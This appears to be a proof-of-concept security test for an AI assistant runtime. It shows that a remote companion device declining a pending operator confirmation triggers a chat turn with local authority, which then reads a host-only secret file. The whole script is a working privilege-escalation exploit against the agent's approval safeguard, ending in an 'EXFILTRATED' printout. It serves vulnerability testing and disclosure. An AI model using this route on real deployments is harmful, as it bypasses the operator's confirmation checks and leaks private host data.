/**
 * Hypothesis: VesperClientGateway.confirm(..., approve=false) calls
 * runtime.chat("Operator denied the pending action.") with NO origin.
 * A remote device therefore drives a turn that runs with LOCAL authority.
 */
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { testRuntime, enrolCompanion } from "../../../../src/vesper/test-helpers.ts";
import { createClientGateway } from "../../../../src/vesper/client/gateway.ts";
import { planProvider, type Step } from "./plan-provider.ts";

const root = await mkdtemp(join(tmpdir(), "vesper-root-"));
await writeFile(join(root, "secret.txt"), "PRIVATE-HOST-ONLY-DATA", "utf8");

const plan: Step[] = [];
const runtime = await testRuntime({
  providers: [planProvider(plan)],
  config: { approvedRoots: [root] },
});
const gw = createClientGateway(runtime);
const peer = await enrolCompanion(runtime, { name: "phone", trust: "trusted" });
const session = await gw.issueSession({
  deviceId: peer.deviceId,
  scopes: ["status", "conversation", "memory.read", "notifications", "operator.confirm"],
});
if ("ok" in session) throw new Error("no session: " + JSON.stringify(session));
console.log("session scopes:", session.scopes.join(","));

function show(label: string, turn: any) {
  console.log(`\n--- ${label} ---`);
  for (const c of turn.toolCalls ?? []) {
    console.log(
      `  tool=${c.toolName} allowed=${c.decision.allowed} ok=${c.result?.ok} :: ${c.result?.summary ?? c.decision.reason}`,
    );
  }
  if (!(turn.toolCalls ?? []).length) console.log("  (no tool calls)");
}

// BASELINE: remote device asks directly for the filesystem.
plan.length = 0;
plan.push({ name: "fs_read", args: { path: join(root, "secret.txt") } }, null);
const direct = await gw.converse(session.token, "read the secret file");
show("BASELINE remote converse -> fs_read", direct);

// Set up a pending confirmation the honest way: the person at the machine.
plan.length = 0;
plan.push({ name: "fs_write", args: { path: join(root, "note.txt"), content: "hi" } }, null);
const local = await runtime.chat("write a note");
const pendingId = [...runtime.confirmations.keys()][0];
console.log("\npending confirmation queued locally:", pendingId, runtime.confirmations.get(pendingId)?.toolName,
  "requestedBy=", JSON.stringify(runtime.confirmations.get(pendingId)?.requestedBy));

// ATTACK: the remote device DECLINES that confirmation.
plan.length = 0;
plan.push({ name: "fs_read", args: { path: join(root, "secret.txt") } }, null);
const denied = await gw.confirm(session.token, pendingId, false);
show("ATTACK remote confirm(approve=false) -> laundered turn", denied);
if ("toolCalls" in (denied as any)) {
  const c = (denied as any).toolCalls?.[0];
  if (c?.result?.ok) {
    console.log("\n!!! EXFILTRATED:", JSON.stringify((c.result.data as any)?.text));
  }
}

await runtime.stop();
